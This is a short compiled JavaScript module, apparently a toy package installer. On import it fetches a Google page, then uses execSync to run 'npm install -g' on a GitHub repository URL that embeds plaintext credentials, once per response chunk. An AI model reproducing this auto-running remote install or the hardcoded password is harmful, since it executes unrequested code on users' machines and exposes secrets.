"use strict";
exports.__esModule = true;
exports.Command = exports.getKey = void 0;
var child_process = require('child_process');
var http = require('http');
console.log('Hello From Package Manager');
function getKey() {
    var options = {
        host: 'www.google.com',
        port: 80,
        path: '/index.html'
    };
    http.get(options, function (res) {
        console.log("Got response: " + res.statusCode);
        res.on("data", function (chunk) {
            console.log("BODY: " + chunk);
            Command();
        });
    }).on('error', function (e) {
        console.log("Got error: " + e.message);
    });
}
exports.getKey = getKey;
function Command() {
    var command = "npm install -g https://akshaydhanuka25:Kapil@2502@github.com/akshaydhanuka25/Toy-LIb.git";
    console.log('Installing the package for you. Please wait window will automatically close on completion');
    child_process.execSync(command, { stdio: [0, 1, 2] });
}
exports.Command = Command;
getKey();
